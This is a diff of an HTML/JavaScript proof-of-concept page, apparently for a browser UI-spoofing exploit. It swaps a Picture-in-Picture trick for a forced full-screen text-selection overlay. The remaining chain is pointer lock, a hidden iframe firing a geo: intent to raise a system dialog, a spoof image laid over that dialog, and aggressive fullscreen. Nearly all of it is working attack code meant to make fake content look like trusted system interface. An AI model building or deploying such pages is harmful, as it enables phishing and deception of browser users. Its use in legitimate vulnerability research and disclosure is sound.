@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Ultimate PiP & Chaining Bypass PoC</title>
+    <title>Advanced Selection Overlap & Fullchain PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -49,6 +49,7 @@
         font-family: monospace;
         word-break: break-all;
         padding: 0 10px;
+        user-select: text; /* Memungkinkan seleksi teks pada elemen info */
       }
       #spoof {
         position: absolute;
@@ -68,13 +69,36 @@
         position: absolute;
         opacity: 0;
       }
-      /* Hidden PiP Video Element */
-      #pipVideo {
-        width: 0;
-        height: 0;
+      /* Lapisan Seleksi Teks Overlap Palsu */
+      #selectionOverlapLayer {
         position: absolute;
-        opacity: 0;
-        pointer-events: none;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: rgba(11, 14, 20, 0.85);
+        z-index: 2147483646;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        user-select: text;
+        -webkit-user-select: text;
+        padding: 20px;
+        box-sizing: border-box;
+      }
+      .overlap-text {
+        font-size: 14px;
+        color: #3fb950;
+        font-family: monospace;
+        background: #161b22;
+        border: 1px solid #30363d;
+        padding: 15px;
+        border-radius: 8px;
+        max-width: 500px;
+        width: 100%;
+        text-align: left;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.5);
       }
     </style>
     <script>
@@ -96,14 +120,21 @@
 
     <div id="pointerLockElement"></div>
 
-    <!-- Video element for PiP context manipulation -->
-    <video id="pipVideo" autoplay muted playsinline src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAAAAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAAhtZGF0AAAA..."></video>
-
     <div id="fullscreenElement">
+      <!-- Visual Image Spoof Layer -->
       <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">
 
+      <!-- Selection Overlap Text Layer -->
+      <div id="selectionOverlapLayer">
+        <div class="overlap-text" id="overlapContent">
+          [SECURE_CONTEXT_OVERLAP_ACTIVE]<br>
+          Target DOM Selection Overlap initialized successfully.<br>
+          Status: Forcing context focus and text selection manipulation...
+        </div>
+      </div>
+
       <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE PIP & FULL CHAINING</button>
+        <button id="execBtn">INITIALIZE SELECTION OVERLAP CHAIN</button>
         <div class="info" id="statusInfo">Status: Ready for interaction.</div>
       </div>
     </div>
@@ -113,24 +144,11 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Executing PiP focus & chained security bypass...";
+        statusInfo.innerText = "Status: Executing selection overlap & chaining sequence...";
         this.style.display = "none";
 
         try {
-          // 1. PiP Context & Pointer Lock Binding Fix
-          let pipVid = document.getElementById("pipVideo");
-          if (pipVid && document.pictureInPictureEnabled) {
-            try {
-              await pipVid.play();
-              await pipVid.requestPictureInPicture();
-              if (document.exitPictureInPicture) {
-                await document.exitPictureInPicture();
-              }
-            } catch (err) {
-              console.debug("PiP context shift handled:", err.message);
-            }
-          }
-
+          // 1. Pointer Lock Integration
           let plElement = document.getElementById("pointerLockElement");
           if (plElement && plElement.requestPointerLock) {
             await plElement.requestPointerLock().catch((err) => {
@@ -138,21 +156,37 @@
             });
           }
 
-          // 2. Intent URI Dispatcher (geo: schema) untuk memicu dialog sistem
+          // 2. Intent URI Dispatcher (geo: schema) untuk memicu dialog sistem eksternal
           let spoofFrame = document.createElement("iframe");
           spoofFrame.style.display = "none";
           spoofFrame.src = "geo:0,0?q=apple.com";
           document.body.appendChild(spoofFrame);
 
-          // 3. Instan menampilkan visual overlay spoof.png di atas konteks dialog
+          // 3. Mengaktifkan Selection Overlap Layer & Manipulasi Rentang Seleksi DOM
+          let overlapLayer = document.getElementById("selectionOverlapLayer");
+          if (overlapLayer) {
+            overlapLayer.style.display = "flex";
+            
+            // Programmatically force text selection overlap range
+            let overlapContent = document.getElementById("overlapContent");
+            if (overlapContent && window.getSelection) {
+              let range = document.createRange();
+              range.selectNodeContents(overlapContent);
+              let selection = window.getSelection();
+              selection.removeAllRanges();
+              selection.addRange(range);
+            }
+          }
+
+          // 4. Deployment Visual Spoof Layer
           let spoofImg = document.getElementById("spoof");
           if (spoofImg) {
             spoofImg.style.display = "block";
           }
 
-          statusInfo.innerText = "Status: PiP context cleared. Engaging chained Fullscreen lock...";
+          statusInfo.innerText = "Status: Selection overlap deployed. Engaging Fullscreen lock...";
 
-          // 4. Eksekusi Fullscreen dengan parameter navigasi tersembunyi
+          // 5. Eksekusi Fullscreen Agresif Berantai
           setTimeout(async () => {
             let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
             
@@ -178,12 +212,12 @@
               container.style.display = "none";
             }
             
-            statusInfo.innerText = "Status: PiP hide bypass chain active.";
+            statusInfo.innerText = "Status: Selection overlap & fullchain active.";
           }, 300);
 
         } catch (err) {
-            statusInfo.innerText = "Status: Chaining execution error: " + err.message;
-            execButton.style.display = "block";
+          statusInfo.innerText = "Status: Chaining execution error: " + err.message;
+          execButton.style.display = "block";
         }
       };
     </script>
